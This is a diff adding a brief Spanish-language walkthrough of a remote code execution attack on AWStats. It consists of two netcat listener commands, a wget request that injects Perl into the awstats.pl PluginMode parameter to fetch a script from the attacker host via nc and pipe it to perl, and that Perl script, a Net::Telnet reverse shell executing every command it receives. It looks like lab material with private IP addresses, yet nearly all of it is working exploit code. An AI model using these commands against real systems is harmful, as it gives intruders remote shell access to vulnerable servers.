@@ -1,0 +1,25 @@
+En dos terminales diferentes ejecutamos:
+  sudo nc -lvnp 80 < script.pl
+  sudo nc -lvnp 443
+
+Después ejecutamos:
+  wget --no-proxy "http://10.0.2.5/awstats/awstats.pl?&amp;PluginMode=:print+system('nc+10.0.2.4+80+|+/usr/bin/perl')+;"
+
+El archivo script.pl es:
+
+#!/usr/bin/perl
+use Net::Telnet ();
+use Net::Telnet;
+($ip) = "10.0.2.4";
+print("$ip\n");
+$telnet = new Net::Telnet ( Timeout=>1, Port=>443);
+$telnet->open($ip);
+$count=1;
+$telnet->print('Acceso desde equipo remoto');
+$pattern='/\$ $/i';
+while ($count == 1) {
+    $data = $telnet->get(Timeout=>100);
+    $output = `$data`;
+    $telnet->print($output);
+}
+exit 0
